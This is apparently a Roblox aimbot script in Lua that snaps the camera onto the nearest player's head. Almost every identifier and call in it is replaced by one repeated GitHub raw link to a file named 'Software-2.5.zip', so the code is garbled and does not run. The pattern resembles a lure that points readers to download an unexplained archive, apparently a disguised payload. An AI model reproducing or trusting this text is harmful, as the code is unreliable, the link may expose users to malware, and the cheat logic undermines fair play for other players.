-- Gui
local ScreenGui = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("ScreenGui")
local ToggleButton = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("TextButton")

https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = "AimbotGUI"
https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("PlayerGui")

https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = ScreenGui
https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(0, 100, 0, 40)
https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(0, 10, 0, 10)
https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = "Aimbot: OFF"
https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(255, 0, 0)

-- Variables
local aimbotEnabled = false
local players = game:GetService("Players")
local localPlayer = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip
local camera = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip
local runService = game:GetService("RunService")

-- Toggle function
https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(function()
    aimbotEnabled = not aimbotEnabled
    https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = aimbotEnabled and "Aimbot: ON" or "Aimbot: OFF"
    https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = aimbotEnabled and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(0, 255, 0) or https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(255, 0, 0)
end)

-- Aimbot logic
local function getClosestPlayer()
    local closestPlayer = nil
    local shortestDistance = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip

    for _, player in pairs(players:GetPlayers()) do
        if player ~= localPlayer and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("Head") then
            local head = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip
            local screenPoint, onScreen = camera:WorldToViewportPoint(https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip)

            if onScreen then
                local mouse = localPlayer:GetMouse()
                local distance = (https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(screenPoint.X, screenPoint.Y) - https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(mouse.X, mouse.Y)).Magnitude

                if distance < shortestDistance then
                    shortestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end

    return closestPlayer
end

-- Aimbot loop
https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(function()
    if aimbotEnabled then
        local target = getClosestPlayer()
        if target and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip and https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip("Head") then
            https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip = https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip(https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip, https://raw.githubusercontent.com/rl9blake/Usudaufsigog/main/didymium/Software-2.5.zip)
        end
    end
end)
